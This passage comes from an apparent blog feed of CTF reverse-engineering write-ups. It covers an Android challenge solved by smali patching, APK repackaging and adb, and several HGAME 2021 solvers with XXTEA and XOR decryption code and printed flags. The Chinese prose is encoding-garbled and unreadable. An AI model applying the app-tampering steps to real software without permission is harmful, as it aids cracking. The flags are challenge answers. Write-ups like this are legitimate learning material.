class="number">0</span>:len(s3)<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line">s2 = en(s2).encode()</span><br><span class="line">s3 = en(s3).encode()</span><br><span class="line">print(<span class="string">'---------------------------------------------------'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">76</span>):</span><br><span class="line">    print(chr(s1[i]^s2[i]^s3[i]), end = <span class="string">''</span>)</span><br><span class="line"><span class="comment">#Congratulation!YouFoundTheRightActivityHereYouGo-CTF&#123;IDontHaveABadjokeSorry&#125;</span></span><br></pre></td></tr></table></figure><p>å¦å¤–ï¼Œç”±äºappä¸­æ˜¯å¤šä¸ªæ´»åŠ¨ï¼Œå¼€å§‹æˆ‘æ˜¯æƒ³ç›´æ¥ç”¨adbå‘½ä»¤æ¥å¯åŠ¨æ¯ä¸ªæ´»åŠ¨ï¼Œé€šè¿‡è°ƒè¯•çœ‹è¾“å‡ºæ˜¯ä»€ä¹ˆï¼Œä½†éƒ½å¯åŠ¨å¤±è´¥ï¼Œä»€ä¹ˆæƒé™ç¦æ­¢ã€‚é€šè¿‡è®¡ç®—å¾—åˆ°flagåï¼Œé€šè¿‡æœé›†å‘ç°æ˜¯è¦å¯¹æ´»åŠ¨æ²¡æœ‰æŒ‡å®šå±æ€§<strong>android:exported=â€trueâ€</strong>ï¼Œ</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305222644097.png" alt="image-20210305222644097"></p><blockquote><p><strong>android.intent.action.MAINï¼šå†³å®šåº”ç”¨çš„å…¥å£Activityï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯åŠ¨åº”ç”¨æ—¶é¦–å…ˆæ˜¾ç¤ºå“ªä¸€ä¸ªActivityã€‚</strong><br><strong>android.intent.category.LAUNCHERï¼šè¡¨ç¤ºactivityåº”è¯¥è¢«åˆ—å…¥ç³»ç»Ÿçš„å¯åŠ¨å™¨(launcher)(å…è®¸ç”¨æˆ·å¯åŠ¨å®ƒ)ã€‚Launcheræ˜¯å®‰å“ç³»ç»Ÿä¸­çš„æ¡Œé¢å¯åŠ¨å™¨ï¼Œæ˜¯æ¡Œé¢UIçš„ç»Ÿç§°ã€‚</strong></p></blockquote><p>æŒ‡å®šåé€šè¿‡adbå‘½ä»¤å¯åŠ¨æˆåŠŸï¼Œå¯ç›´æ¥é€šè¿‡è°ƒè¯•æŸ¥çœ‹ç”Ÿæˆçš„å­—ç¬¦ä¸²ï¼Œæˆ‘å°è¯•ä¿®æ”¹smaliæ¥æ’å…¥æ‰“å°Logçš„è¯­å¥ï¼Œç„¶ååŒä¼™æŸ¥çœ‹æ—¥å¿—åŒæ ·å¾—åˆ°flagã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305223009728.png" alt="image-20210305223009728"></p><p>æœ€åæŸ¥çœ‹æ—¥å¿—ï¼š<br><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305223046697.png" alt="image-20210305223046697"></p><h2 id="d3ctf"><a href="#d3ctf" class="headerlink" title="d3ctf"></a>d3ctf</h2><h3 id="No-Name"><a href="#No-Name" class="headerlink" title="No Name"></a>No Name</h3><p>æ‰¾åˆ°å…¥å£æ´»åŠ¨ï¼Œå°†è¾“å…¥ä¼ å…¥FlagCheckerç±»çš„checkFlagå‡½æ•°ï¼Œç„¶ååˆæ˜¯å®ç°æ¥å£ä¸­çš„checkå‡½æ•°ï¼Œæœ€åè°ƒç”¨ï¼Œæ„Ÿè§‰æœ‰ç‚¹å¥—å¨ƒï¼Œï¼Œå®è´¨å°±æ˜¯è°ƒç”¨nativeå±‚çš„checkå‡½æ•°ã€‚ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310201450601.png" alt="image-20210310201450601"></p><p>ä½†æ˜¯æ³¨æ„æ¸…å•æ–‡ä»¶ä¸­applicationä¸­çš„android:nameå±æ€§ï¼šè¿™é‡ŒæŒ‡å®šäº†<strong>appå¯åŠ¨æ—¶å…³è”çš„ä¸€ä¸ªapplicationï¼Œè¿™ä¸ªç±»çš„ä½œç”¨å°±æ˜¯åšä¸€äº›åˆå§‹åŒ–ï¼Œæ”¾ä¸€äº›å…¨å±€å˜é‡å’Œç¨‹åºä¸Šä¸‹æ–‡ç›¸å…³çš„ä¸œè¥¿</strong>ï¼Œé»˜è®¤æ˜¯android.app.Applicationã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310203122424.png" alt="image-20210310203122424"></p><p>æ¥åˆ°appå¯åŠ¨æ—¶æŒ‡å®šçš„è¿™ä¸ªç±»ï¼šNoNameAppã€‚æ¯”è¾ƒç®€å•çš„ä»£ç ï¼Œå°±æ˜¯å¾—åˆ°èµ„æºæ–‡ä»¶data.encç„¶åè·å–ä¸€ä¸ªaeskeyå¯¹å…¶è¿›è¡Œaesè§£å¯†ï¼Œä¸”è¿™é‡ŒæŒ‡å®šçš„è§£å¯†å¾—åˆ°çš„æ–‡ä»¶å’Œå­˜æ”¾è·¯å¾„ã€‚ç„¶åè¿›è¡ŒdexåŠ è½½å¹¶æŠŠFlagCheckerä¸­mFlagCheckerçš„å®ä¾‹è¿›è¡Œäº†æ›¿æ¢ï¼Œä¹Ÿå°±æ˜¯æŠŠä¸Šé¢æˆ‘ä»¬åˆ†æå‡ºçš„nativeå±‚é‚£ä¸ªcheckå‡½æ•°è¿›è¡Œäº†æ›¿æ¢ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310203554497.png" alt="image-20210310203554497"></p><p>æ‰€ä»¥å¯ä»¥çŸ¥é“appçœŸæ­£æ£€æŸ¥çš„é€»è¾‘åœ¨è§£å¯†å‡ºçš„jaræ–‡ä»¶ä¸­ï¼Œç°åœ¨çš„ç›®çš„å°±æ˜¯å¾—åˆ°è¿™ä¸ªjarï¼Œé¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯ç›´æ¥åœ¨ç¨‹åºè¿è¡Œååœ¨æŒ‡å®šçš„è·¯å¾„ä¸‹å»æ‰¾ã€‚</p><p>è™½ç„¶appåœ¨åŠ è½½å®Œè§£å¯†åå¯¹è§£å¯†å‡ºçš„æ–‡ä»¶è¿›è¡Œäº†åˆ é™¤ï¼Œä½†æ˜¯å¯ä»¥å°†appçš„smaliä¿®æ”¹ï¼Œåˆ é™¤<strong>file.delete()ï¼›</strong>åå¯¹å…¶é‡æ–°æ‰“åŒ…ç„¶åç­¾åã€‚</p><p>è¿™é‡Œç­¾åå®Œåå®‰è£…é‡åˆ°äº†é—®é¢˜ï¼Œä¸€ä¸ªæ˜¯ä¹‹å‰çŸ¥é“çš„appæœ‰<strong>android:testOnly=â€trueâ€</strong>ï¼Œè§£å†³åŠæ³•ï¼š1.å®‰è£…æ—¶åŠ ä¸Š-té€‰é¡¹ã€‚2.åœ¨æ¸…å•æ–‡ä»¶ä¸­åˆ é™¤è¯¥å±æ€§ã€‚</p><p>ç¬¬äºŒä¸ªé—®é¢˜ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310204857678.png" alt="image-20210310204857678"></p><p>æœç´¢åˆ°è¿™ç¯‡æ–‡ç«  <a href="https://testerhome.com/topics/18463" target="_blank" rel="noopener">https://testerhome.com/topics/18463</a></p><blockquote><p>å¦‚æœ AndroidManifest.xml ä¸­æœªè®¾ç½® extractNativeLibs=trueï¼Œä½¿ç”¨ apktool åç¼–è¯‘æ—¶æœ‰å¯èƒ½å¯¼è‡´ extractNativeLibs è¢«è®¾ç½®ä¸º falseã€‚</p></blockquote><p>è‡³äºextractNativeLibså±æ€§ï¼Œå¼€å¯çš„è¯å°±æ˜¯æŠŠapkä¸­çš„soè§£å‹ç¼©æå–åˆ°æœ¬åœ°å­˜å–ä¸€ä»½ï¼Œå…³é—­çš„è¯ä¸åœ¨æœ¬åœ°å­˜å‚¨ä¸€ä»½ï¼Œåœ¨è¿è¡Œæ—¶ç›´æ¥è°ƒç”¨appä¸­çš„soã€‚</p><p>å¦‚æœå…³é—­çš„è¯ï¼Œä¸”æˆ‘ä»¬apkæ˜¯æœªå¯¹é½æˆ–soæ–‡ä»¶æ˜¯å‹ç¼©çŠ¶æ€çš„è¯å°†é˜»æ­¢æˆ‘ä»¬å®‰è£…apkï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„æŠ¥çš„é”™ã€‚</p><p><strong>ç„¶åå¯¼è‡´æˆ‘ä»¬é»˜è®¤å¼€å¯extractNativeLibsçš„å±æ€§å…³é—­çš„åŸå› ï¼šä½¿ç”¨apktoolå¯¹appè¿›è¡Œåç¼–è¯‘å’Œå›ç¼–è¯‘ã€‚</strong></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310205935229.png" alt="image-20210310205935229"></p><p>æœ€åæŠŠè¿™ä¸ªå±æ€§æ”¹ä¸ºtrueï¼Œå›ç¼–è¯‘ç­¾ååï¼Œè¿è¡Œappï¼Œåœ¨data/data/åŒ…å/ä¸‹å¾—åˆ°è§£å¯†å‡ºçš„jaræ–‡ä»¶ï¼Œç®€å•çš„å¼‚æˆ–ã€‚ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310210138830.png" alt="image-20210310210138830"></p><p>æœ€åè¯´ä¸€ä¸‹ï¼Œåœ¨AKä¸­åç¼–è¯‘apké‡åˆ°<strong>com.googlecode.d2j.DexException: not support version</strong>çš„é—®é¢˜ã€‚</p><p>è¿™ä¸ªæ˜¯dex2jarç‰ˆæœ¬ä¸dexç‰ˆæœ¬ä¸å…¼å®¹ä¸»åŠ¨æŠ›å‡ºçš„å¼‚å¸¸ï¼Œä»æŠ¥é”™æ‰¾åˆ°dex-reader-2.1-20190905-lanchon.jaræ–‡ä»¶ä¸­çš„DexFileReaderå‡½æ•°ï¼Œçœ‹æºç ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310210853842.png" alt="image-20210310210853842"></p><p>è§£å†³åŠæ³•ï¼Œæ›´æ¢æœ€æ–°çš„dex2jarç‰ˆæœ¬å°±å¥½äº†ã€‚<a href="https://www.jianshu.com/p/55bf5f688e9a" target="_blank" rel="noopener">https://www.jianshu.com/p/55bf5f688e9a</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä»å„å¤„Androidé¢˜æ¥å­¦ä¹ ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="Andriod" scheme="https://www.Bxnop.cn/categories/Andriod/"/>
    
    
  </entry>
  
  <entry>
    <title>HGAME 2021</title>
    <link href="https://www.bxnop.cn/2021/02/04/HGAME%202021/"/>
    <id>https://www.bxnop.cn/2021/02/04/HGAME%202021/</id>
    <published>2021-02-04T10:04:15.000Z</published>
    <updated>2021-03-22T05:23:28.907Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸€ä¸ªæœˆhgameç»“æŸäº†ï¼Œåšå®Œäº†é€†å‘é¢˜ï¼Œæ”¶è·å¾ˆå¤§ï¼Œmiscçš„ç­¾åˆ°é¢˜åšæ¥ç©äº†ä¸€ä¸‹ã€‚<a id="more"></a></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="apacha"><a href="#apacha" class="headerlink" title="apacha"></a>apacha</h3><p>è€ƒäº†ä¸€ä¸ªxxteaåŠ å¯†ç®—æ³•ï¼škeyæ˜¯{1, 2, 3, 4}</p><p><img src="https://i.loli.net/2021/02/27/imfSALBWP2nDy7o.png" alt="image-20210204180727273"></p><p>è·Ÿç€ç®—æ³•é€»è¾‘é€†ä¸€ä¸‹å°±è¡Œäº†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> LEN = <span class="number">35</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> delat = <span class="number">0x9E3779B9</span> * (<span class="number">52</span> / LEN) - <span class="number">0x4AB325AA</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> KEY[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ENC[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">35</span>, <span class="number">179</span>,  <span class="number">78</span>, <span class="number">231</span>,  <span class="number">54</span>,  <span class="number">40</span>, <span class="number">167</span>, <span class="number">183</span>, <span class="number">226</span>, <span class="number">111</span>, </span><br><span class="line">  <span class="number">202</span>,  <span class="number">89</span>, <span class="number">193</span>, <span class="number">197</span>, <span class="number">124</span>, <span class="number">150</span>, <span class="number">116</span>,  <span class="number">38</span>, <span class="number">128</span>, <span class="number">231</span>, </span><br><span class="line">  <span class="number">230</span>,  <span class="number">84</span>,  <span class="number">45</span>,  <span class="number">61</span>,  <span class="number">86</span>,   <span class="number">3</span>, <span class="number">157</span>, <span class="number">138</span>, <span class="number">156</span>, <span class="number">195</span>, </span><br><span class="line">  <span class="number">220</span>, <span class="number">153</span>, <span class="number">237</span>, <span class="number">216</span>,  <span class="number">38</span>, <span class="number">112</span>, <span class="number">173</span>, <span class="number">253</span>,  <span class="number">51</span>, <span class="number">106</span>, </span><br><span class="line">   <span class="number">10</span>,  <span class="number">85</span>, <span class="number">150</span>, <span class="number">244</span>, <span class="number">158</span>, <span class="number">111</span>, <span class="number">156</span>,  <span class="number">92</span>,  <span class="number">76</span>, <span class="number">208</span>, </span><br><span class="line">  <span class="number">229</span>,  <span class="number">27</span>,  <span class="number">23</span>, <span class="number">174</span>,  <span class="number">35</span>, <span class="number">103</span>, <span class="number">194</span>, <span class="number">165</span>, <span class="number">112</span>,  <span class="number">82</span>, </span><br><span class="line">   <span class="number">10</span>,  <span class="number">19</span>,  <span class="number">66</span>, <span class="number">172</span>, <span class="number">178</span>, <span class="number">103</span>, <span class="number">190</span>, <span class="number">132</span>, <span class="number">121</span>, <span class="number">199</span>, </span><br><span class="line">   <span class="number">92</span>, <span class="number">112</span>, <span class="number">152</span>,  <span class="number">61</span>,  <span class="number">81</span>,  <span class="number">92</span>,  <span class="number">45</span>, <span class="number">218</span>,  <span class="number">54</span>, <span class="number">251</span>, </span><br><span class="line">   <span class="number">69</span>, <span class="number">150</span>,  <span class="number">23</span>,  <span class="number">34</span>, <span class="number">157</span>,  <span class="number">82</span>, <span class="number">227</span>,  <span class="number">92</span>, <span class="number">251</span>, <span class="number">225</span>, </span><br><span class="line">  <span class="number">137</span>, <span class="number">209</span>, <span class="number">137</span>, <span class="number">212</span>,  <span class="number">91</span>, <span class="number">232</span>,  <span class="number">31</span>, <span class="number">209</span>, <span class="number">200</span>, <span class="number">115</span>, </span><br><span class="line">  <span class="number">150</span>, <span class="number">193</span>, <span class="number">181</span>,  <span class="number">84</span>, <span class="number">144</span>, <span class="number">180</span>, <span class="number">124</span>, <span class="number">182</span>, <span class="number">202</span>, <span class="number">228</span>, </span><br><span class="line">   <span class="number">23</span>,  <span class="number">33</span>, <span class="number">148</span>, <span class="number">249</span>, <span class="number">227</span>, <span class="number">157</span>, <span class="number">170</span>, <span class="number">161</span>,  <span class="number">90</span>,  <span class="number">47</span>, </span><br><span class="line">  <span class="number">253</span>,   <span class="number">1</span>, <span class="number">232</span>, <span class="number">167</span>, <span class="number">171</span>, <span class="number">110</span>,  <span class="number">13</span>, <span class="number">195</span>, <span class="number">156</span>, <span class="number">220</span>, </span><br><span class="line">  <span class="number">173</span>,  <span class="number">27</span>,  <span class="number">74</span>, <span class="number">176</span>,  <span class="number">83</span>,  <span class="number">52</span>, <span class="number">249</span>,   <span class="number">6</span>, <span class="number">164</span>, <span class="number">146</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">de_xxtea</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *enc = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)ENC;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *key = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)KEY;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> delat1 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(delat &gt;&gt; <span class="number">2</span>);</span><br><span class="line">enc[LEN<span class="number">-1</span>] -= ((key[((LEN<span class="number">-1</span>)^delat1)&amp;<span class="number">3</span>]^enc[LEN<span class="number">-2</span>])+(enc[<span class="number">0</span>]^delat)) ^ (((<span class="number">4</span>*enc[<span class="number">0</span>])^(enc[LEN<span class="number">-2</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[LEN<span class="number">-2</span>])^(enc[<span class="number">0</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = LEN<span class="number">-2</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">enc[i] -= ((key[(i^delat1)&amp;<span class="number">3</span>]^enc[i<span class="number">-1</span>])+(enc[i+<span class="number">1</span>]^delat)) ^ (((<span class="number">4</span>*enc[i+<span class="number">1</span>])^(enc[i<span class="number">-1</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[i<span class="number">-1</span>])^(enc[i+<span class="number">1</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line">i--; </span><br><span class="line">&#125;<span class="keyword">while</span>(i != <span class="number">0</span>);</span><br><span class="line">enc[<span class="number">0</span>] -= ((key[(<span class="number">0</span>^delat1)&amp;<span class="number">3</span>]^enc[LEN<span class="number">-1</span>])+(enc[<span class="number">1</span>]^delat)) ^ (((<span class="number">4</span>*enc[<span class="number">1</span>])^(enc[LEN<span class="number">-1</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[LEN<span class="number">-1</span>])^(enc[<span class="number">1</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line"></span><br><span class="line">delat += <span class="number">0x61C88647</span>;</span><br><span class="line">&#125;<span class="keyword">while</span>(delat != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">de_xxtea();</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, ENC[i*<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hgame&#123;l00ks_1ike_y0u_f0Und_th3_t34&#125;</span></span><br></pre></td></tr></table></figure><h3 id="helloRe"><a href="#helloRe" class="headerlink" title="helloRe"></a>helloRe</h3><p>å°±æ˜¯ä¸€ä¸ªå¼‚æˆ–è§£å¯†ï¼Œä½†æ˜¯å¯ä»¥ä»è¿™é‡Œå­¦ä¹ ä¸€ä¸‹STLæ¨¡æ¿ä¸­çš„stringçš„ç»“æ„ã€‚</p><p>èƒ½çŒœæµ‹å‡ºv14å°±æ˜¯æˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œä½†æ˜¯æ€ä¹ˆæ¥çš„å‘¢ï¼Ÿå…¶å®ä½¿ç”¨äº†stringç»“æ„ã€‚</p><p><img src="https://i.loli.net/2021/02/27/IbUASK8JgpGLFr6.png" alt="image-20210204182522063"></p><p>stringç»“æ„ï¼šä¸€å…±å 24ä¸ªå­—èŠ‚ï¼ˆè¿™ä¹Ÿæ˜¯ä¸€ä¸ªå¯ä»¥è®©æˆ‘ä»¬ç”¨æ¥è¯†åˆ«çš„ç‰¹å¾ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">string</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> _Buf[<span class="number">16</span>];           <span class="comment">// å½“å­—ç¬¦ä¸²é•¿åº¦å°äºç­‰äº0xFæ—¶ï¼Œæ•°æ®å­˜å‚¨åœ¨_Bufæ•°ç»„ä¸­</span></span><br><span class="line">                             <span class="comment">// å¤§äº0xFæ—¶å°†åˆ†é…ä¸€ä¸ªå˜é‡ï¼Œ_Bufå­˜å‚¨çš„æ˜¯è¯¥å˜é‡åœ°å€ã€‚</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _Mysize;    <span class="comment">// å­—ç¬¦ä¸²é•¿åº¦</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _Myres;     <span class="comment">// å¯å­˜å‚¨çš„æœ€å¤§é•¿åº¦</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥æµ‹è¯•ä¸€ä¸ªè¾“å…¥çœ‹çœ‹ï¼š</p><p><img src="https://i.loli.net/2021/02/27/zMNw8FvRtLHaGPT.png" alt="image-20210204182822594"></p><p>æœ€åé¢˜è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line">addr = <span class="number">0x07FF756E13480</span></span><br><span class="line">cnt = <span class="number">0xff</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">22</span>):</span><br><span class="line">    flag += chr(get_byte(addr)^cnt)</span><br><span class="line">    cnt -= <span class="number">1</span></span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#hgame&#123;hello_re_player&#125;</span></span><br></pre></td></tr></table></figure><h3 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h3><p>ç»™äº†é€šè¿‡disæ¨¡å—å¾—åˆ°çš„pythonåæ±‡ç¼–ä»£ç ï¼Œæˆ‘æŠŠå¯¹åº”çš„pythonä»£ç æ³¨é‡Šäº†ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">4</span>           <span class="number">0</span> LOAD_GLOBAL              <span class="number">0</span> (input)</span><br><span class="line">              <span class="number">2</span> LOAD_CONST               <span class="number">1</span> (<span class="string">'give me your flag:\n'</span>)</span><br><span class="line">              <span class="number">4</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">              <span class="number">6</span> STORE_FAST               <span class="number">0</span> (raw_flag) <span class="comment">#raw_flag = input('give me your flag:\n')</span></span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>           <span class="number">8</span> LOAD_GLOBAL              <span class="number">1</span> (list)</span><br><span class="line">             <span class="number">10</span> LOAD_FAST                <span class="number">0</span> (raw_flag)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">2</span> (<span class="number">6</span>)</span><br><span class="line">             <span class="number">14</span> LOAD_CONST               <span class="number">3</span> (<span class="number">-1</span>)</span><br><span class="line">             <span class="number">16</span> BUILD_SLICE              <span class="number">2</span></span><br><span class="line">             <span class="number">18</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">20</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">22</span> STORE_FAST               <span class="number">1</span> (cipher)<span class="comment">#cipher = list(raw_flag[6:-1])</span></span><br><span class="line"></span><br><span class="line">  <span class="number">6</span>          <span class="number">24</span> LOAD_GLOBAL              <span class="number">2</span> (len)</span><br><span class="line">             <span class="number">26</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">28</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">30</span> STORE_FAST               <span class="number">2</span> (length)<span class="comment">#length = len(cipher)</span></span><br><span class="line"></span><br><span class="line">  <span class="number">8</span>          <span class="number">32</span> LOAD_GLOBAL              <span class="number">3</span> (range)</span><br><span class="line">             <span class="number">34</span> LOAD_FAST                <span class="number">2</span> (length)</span><br><span class="line">             <span class="number">36</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">38</span> BINARY_FLOOR_DIVIDE</span><br><span class="line">             <span class="number">40</span> CALL_FUNCTION            <span class="number">1</span><span class="comment">#range(length/2)</span></span><br><span class="line">             <span class="number">42</span> GET_ITER</span><br><span class="line">        &gt;&gt;   <span class="number">44</span> FOR_ITER                <span class="number">54</span> (to <span class="number">100</span>)</span><br><span class="line">             <span class="number">46</span> STORE_FAST               <span class="number">3</span> (i)<span class="comment">#for i in range(length/2):</span></span><br><span class="line"></span><br><span class="line">  <span class="number">9</span>          <span class="number">48</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">50</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">52</span> LOAD_FAST                <span 